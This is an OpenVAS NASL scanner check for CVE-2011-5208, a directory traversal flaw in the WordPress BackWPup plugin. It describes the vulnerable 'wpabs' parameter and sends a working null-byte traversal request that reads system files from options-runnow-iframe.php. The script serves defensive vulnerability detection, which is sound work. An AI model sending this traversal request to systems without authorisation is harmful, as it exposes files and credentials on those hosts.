###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_backwpup_plugin_mult_dir_traversal_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress BackWPup Plugin Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802979");
  script_version("$Revision: 13962 $");
  script_cve_id("CVE-2011-5208");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Do, 26 Okt 2017)$");
  script_tag(name:"creation_date", value:"2012-10-09 14:50:11 +0530 (Tue, 09 Oct 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress BackWPup Plugin Multiple Directory Traversal Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43565");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Feb/663");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"WordPress BackWPup Plugin Version prior to 1.4.1");

  script_tag(name:"insight", value:"Input passed via the 'wpabs' parameter to
  wp-content/plugins/backwpup/app/options-view_log-iframe.php
  (when logfile is set to an existing file) and to
  wp-content/plugins/backwpup/app/options-runnow-iframe.php
  (when jobid is set to a numeric value) is not properly verified before being
  used to include files.");

  script_tag(name:"solution", value:"Upgrade to WordPress BackWPup Plugin version 1.4.1 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress BackWPup Plugin and is prone to
  multiple directory traversal vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/backwpup/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = dir + "/wp-content/plugins/backwpup/app/options-runnow-iframe.php?wpabs=/" + files[file] + "%00&jobid=1";

  if(http_vuln_check(port:port, url:url,pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);